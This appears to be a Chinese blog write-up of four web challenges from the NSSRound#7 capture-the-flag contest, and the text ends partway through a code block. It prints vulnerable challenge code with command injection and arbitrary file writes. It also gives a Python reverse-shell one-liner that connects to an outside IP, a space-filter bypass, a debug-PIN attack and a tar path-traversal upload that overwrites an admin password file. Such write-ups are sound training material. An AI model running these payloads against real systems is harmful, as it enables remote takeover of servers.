<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>[NSSRound#7 Team]Web学习 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="[NSSRound#7 Team]Web学习" />
<meta property="og:description" content="系列文章目录 提示：写完文章后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 系列文章目录一、ecRCE二、Shadowflag三、[NSSRound#7 Team]新的博客四、[NSSRound#7 Team]0o0 提示：以下是本篇文章正文内容，下面案例可供参考
一、ecRCE 进入题目直接给出了源码：
&lt;!-- A EZ RCE IN REALWORLD _ FROM CHINA.TW --&gt; &lt;!-- By 探姬 --&gt; &lt;?PHP if(!isset($_POST[&#34;action&#34;]) &amp;&amp; !isset($_POST[&#34;data&#34;])) show_source(__FILE__); putenv(&#39;LANG=zh_TW.utf8&#39;); $action = $_POST[&#34;action&#34;]; $data = &#34;&#39;&#34;.$_POST[&#34;data&#34;].&#34;&#39;&#34;; $output = shell_exec(&#34;/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar $action $data&#34;); echo $output; ?&gt; 直接使用了shell_exec运行了一个java文件，后面接了 a c t i o n 和 action和 action和data变量，可以使用管道符直接运行命令。
二、Shadowflag 进入题目直接给出源码 from flask import Flask, request import os from time import sleep app = Flask(__name__) flag1 = open(&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/ed2fb13ced5552500e753c5125859779/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-31T18:29:09+08:00" />
<meta property="article:modified_time" content="2023-01-31T18:29:09+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">[NSSRound#7 Team]Web学习</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h2><a id="_0"></a>系列文章目录</h2> 
<hr> 
<p><code>提示：写完文章后，目录可以自动生成，如何生成可参考右边的帮助文档</code></p> 
<p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#_0" rel="nofollow">系列文章目录</a></li><li><a href="#ecRCE_11" rel="nofollow">一、ecRCE</a></li><li><a href="#Shadowflag_36" rel="nofollow">二、Shadowflag</a></li><li><a href="#NSSRound7_Team_107" rel="nofollow">三、[NSSRound#7 Team]新的博客</a></li><li><a href="#NSSRound7_Team0o0_129" rel="nofollow">四、[NSSRound#7 Team]0o0</a></li></ul> 
</div> 
<p></p> 
<hr> 
<p><code>提示：以下是本篇文章正文内容，下面案例可供参考</code></p> 
<h2><a id="ecRCE_11"></a>一、ecRCE</h2> 
<p>进入题目直接给出了源码：</p> 
<pre><code class="prism language-php"> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token constant">A</span> <span class="token constant">EZ</span> <span class="token constant">RCE</span> <span class="token constant">IN</span> <span class="token constant">REALWORLD</span> <span class="token constant">_</span> <span class="token constant">FROM</span> <span class="token constant">CHINA</span><span class="token operator">.</span><span class="token constant">TW</span> <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> By 探姬 <span class="token operator">--</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token constant">PHP</span>
    
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"action"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'LANG=zh_TW.utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 

    <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"action"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span><span class="token operator">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span>

    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/var/packages/Java8/target/j2sdk-image/bin/java -jar jar/NCHU.jar <span class="token interpolation"><span class="token variable">$action</span></span> <span class="token interpolation"><span class="token variable">$data</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    
<span class="token operator">?</span><span class="token operator">&gt;</span> 
</code></pre> 
<blockquote> 
 <p>直接使用了shell_exec运行了一个java文件，后面接了<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          a 
         
        
          c 
         
        
          t 
         
        
          i 
         
        
          o 
         
        
          n 
         
        
          和 
         
        
       
         action和 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6833em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord mathnormal">t</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">和</span></span></span></span></span>data变量，可以使用管道符直接运行命令。<br> <img src="https://images2.imgbox.com/e8/ab/Fl7Zmvyc_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<h2><a id="Shadowflag_36"></a>二、Shadowflag</h2> 
<ol><li>进入题目直接给出源码</li></ol> 
<pre><code class="prism language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request
<span class="token keyword">import</span> os
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

flag1 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/flag1.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/tmp/flag2.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    flag2 <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
tag <span class="token operator">=</span> <span class="token boolean">False</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"app.py"</span><span class="token punctuation">,</span> <span class="token string">"r+"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/shell"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">global</span> tag
    <span class="token keyword">if</span> tag <span class="token operator">!=</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">global</span> flag1
        <span class="token keyword">del</span> flag1
        tag <span class="token operator">=</span> <span class="token boolean">True</span>
    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"rm -f /tmp/flag1.txt /tmp/flag2.txt"</span><span class="token punctuation">)</span>
    action <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">"act"</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> action<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"Nonono"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>action<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"Wow"</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">error_date</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token string">"扫扫扫，扫啥东方明珠呢[怒]"</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre> 
<blockquote> 
 <p>访问了一下/console，是存在的，证明debug是开启的，源码中rm了flag1可以尝试下在不在进程proc中，flag2存在于python运行的程序中，需要调试程序，os.system()应该是用于反弹shell(其中要不包含空格，可以使用<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
        
          I 
         
        
          F 
         
        
          S 
         
        
          、 
         
        
       
         IFS、 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.6833em;"></span><span class="mord mathnormal" style="margin-right: 0.0785em;">I</span><span class="mord mathnormal" style="margin-right: 0.0576em;">FS</span><span class="mord cjk_fallback">、</span></span></span></span></span>IFS$9等绕过空格)，让用户得知文件信息计算PIN码，进入控制台调试得到flag2。</p> 
</blockquote> 
<ol start="2"><li>反弹shell<br> <img src="https://images2.imgbox.com/39/e7/7H4G4QWC_o.png" alt="在这里插入图片描述"></li></ol> 
<blockquote> 
 <p>开始尝试使用bash反弹shell，但是好像反弹不成功，然后就上网找python的反弹shell。<br> python3<span class="katex--inline"><span class="katex"><span class="katex-mathml"> 
      
       
        
         
         
           I 
          
         
           F 
          
         
           S 
          
         
        
          − 
         
        
          c 
         
        
       
         {IFS}-c 
        
       
     </span><span class="katex-html"><span class="base"><span class="strut" style="height: 0.7667em; vertical-align: -0.0833em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right: 0.0785em;">I</span><span class="mord mathnormal" style="margin-right: 0.0576em;">FS</span></span><span class="mspace" style="margin-right: 0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.2222em;"></span></span><span class="base"><span class="strut" style="height: 0.4306em;"></span><span class="mord mathnormal">c</span></span></span></span></span>{IFS}‘socket=<strong>import</strong>(“socket”);os=<strong>import</strong>(“os”);pty=<strong>import</strong>(“pty”);s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“120.79.29.170”,4000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(“/bin/sh”)’<br> 原理就是使用python创建套接字，定义一个唯一进程，向主机发起连接，通过os.dup2()进行重定向，0，1，2表示输入、输出、错误内容都传送到socket，然后使用/bin/sh让shell可以进行交互。</p> 
</blockquote> 
<ol start="3"><li>查找删除flag1的进程是否未关闭<br> <img src="https://images2.imgbox.com/78/01/eom0jug6_o.png" alt="在这里插入图片描述"></li></ol> 
<blockquote> 
 <p>在进程18中找到rm的进程，还未关闭，可以直接读取出来，原因就是在linux删除文件时，某个程序直接使用或者占用这个文件，执行删除命令并没有立刻删除，占用的空间也没有被回收等原因。</p> 
</blockquote> 
<ol start="4"><li>读取计算PIN码的数据<br> <img src="https://images2.imgbox.com/e4/84/jU2sYyGl_o.png" alt="在这里插入图片描述"></li></ol> 
<blockquote> 
 <p>由于是docker机的原因所以这里没有/etc/machine-id，所以要读取/proc/sys/kernel/random/boot_id，至于如何生成PIN码，NSSROUND#6中已经分析过。</p> 
</blockquote> 
<ol start="5"><li>进入控制台调试得到flag2<br> <img src="https://images2.imgbox.com/28/6b/PUSQBako_o.png" alt="在这里插入图片描述"></li></ol> 
<h2><a id="NSSRound7_Team_107"></a>三、[NSSRound#7 Team]新的博客</h2> 
<ol><li>进入题目<br> <img src="https://images2.imgbox.com/84/da/4uUVx86c_o.png" alt="在这里插入图片描述"></li></ol> 
<blockquote> 
 <p>存在url跳转，只有上面好险啊能够跳转，存在注册和登录功能，注册后进入看看。<br> <img src="https://images2.imgbox.com/33/4c/I9fVr8w4_o.png" alt="在这里插入图片描述"><br> 提示了源码的目录，两次base和hex得到了static/www.tar.gz，并且存在备份和下载接口，直至看到可以上传tar.gz后缀名文件，并且看到了是python写的，就猜到了跟ROUND6一样，应该是python那个文件覆盖漏洞，下载文件回来，提示使用admin登录即可获得flag，并且conf中存在json格式使用sha512加密的密码，应该是上传userinfo.json文件覆盖掉原来的，然后便可以使用admin登录。</p> 
</blockquote> 
<p>先使用sha512加密，制造一个userinfo.json的文件：</p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> json

password<span class="token operator">=</span><span class="token string">'123456'</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'userinfo.json'</span><span class="token punctuation">,</span><span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token string">'admin'</span><span class="token punctuation">:</span>hashlib<span class="token punctuation">.</span>sha512<span class="token punctuation">(</span>password<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre> 
<blockquote> 
 <p>然后就是压缩成tar.gz文件，但是python的文件覆盖目录和路径要几乎一致，于是需要得到存放的目录路径，从/blog/backup中，可以看到是以为用户名开头的目录，然后源码是www/app/conf/userinfo.json，所以conf前面应该还有两个目录，压缩的时候，要一致，可以为 用户名/…/…/conf/userinfo.json，压缩好后上传，注销，使用123456登录admin即得到了flag。<br> <img src="https://images2.imgbox.com/de/91/GpjKmVps_o.png" alt="在这里插入图片描述"></p> 
</blockquote> 
<h2><a id="NSSRound7_Team0o0_129"></a>四、[NSSRound#7 Team]0o0</h2> 
<ol><li>这题很tips，没有见过，所以看WP学习了，觉得很有意思，首先进入题目：<br> <img src="https://images2.imgbox.com/d2/8d/RfHHbE43_o.png" alt="在这里插入图片描述"></li><li>GET访问S0uRc3进入第一层level，源码：</li></ol> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get:S0uRc3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">set_include_path</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Round7/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// include: Nss</span>
<span class="token comment">// include: level2</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0o0'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token variable">$O0O</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'0o0'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$O0O</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Round7'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'NO!!!!!   Permission denied!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$O0O</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Xy1on'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$O0O</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nothing!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'S0uRc3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$O0O</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'CTF'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$O0O</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Nothing here"</span><span class="token punctuation">;</span>

<span class="token punctuation">}</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<blockquote> 
 <p>目录是Round7，通过strpos()函数查找Xy1on要出现在0的位置上，输出file_get_content()获取到的文件，这里需要获取的是level2，但是获取level2时候要有Xy1on出现在头位置，通过github的工具梭 <a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p> 
</blockquote> 
<p>![在这里插入图片描述](https://img-blog.csdnimg.cn/b371bfb62941424bb73c6962d030c5d6.png<br> <img src="https://images2.imgbox.com/02/4e/DrZ2SQiI_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/45/87/LHmnMylF_o.png" alt="在这里插入图片描述"></p> 
<ol start="3"><li>访问Ns_SCtF.php，得到源码:</li></ol> 
<pre><code class="prism language-php"> <span class="token operator">&lt;</span><span class="token operator">?</span>php
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$NSSCTF</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NSSCTF'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$NsSCTF</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NsSCTF'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$NsScTF</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NsScTF'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$NsScTf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NsScTf'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$NSScTf</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'NSScTf'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$nSScTF</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nSScTF'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$nSscTF</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nSscTF'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$NSSCTF</span> <span class="token operator">!=</span> <span class="token variable">$NsSCTF</span> <span class="token operator">&amp;&amp;</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$NSSCTF</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$NsSCTF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$NsScTF</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$NsScTF</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$NsScTf</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"Welcome to Round7!!!"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nss_ctfer.vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$NSScTf</span> <span class="token operator">!=</span> <span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$NSScTf</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">114514</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$nss</span> <span class="token operator">=</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$nSScTF</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$nSscTF</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string double-quoted-string">"NSSRound7"</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$nss</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$nSscTF</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"NSSRound7"</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                            <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".png"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NoO0P00oO0! Png! pNg! pnG!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                            <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token variable">$real_content</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php die("Round7 do you like");'</span><span class="token operator">.</span> <span class="token variable">$content</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'?&gt;'</span><span class="token punctuation">;</span>
                            <span class="token variable">$real_name</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$real_name</span><span class="token punctuation">,</span> <span class="token variable">$real_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$real_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"OoO0o0hhh."</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NoO0oO0oO0!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
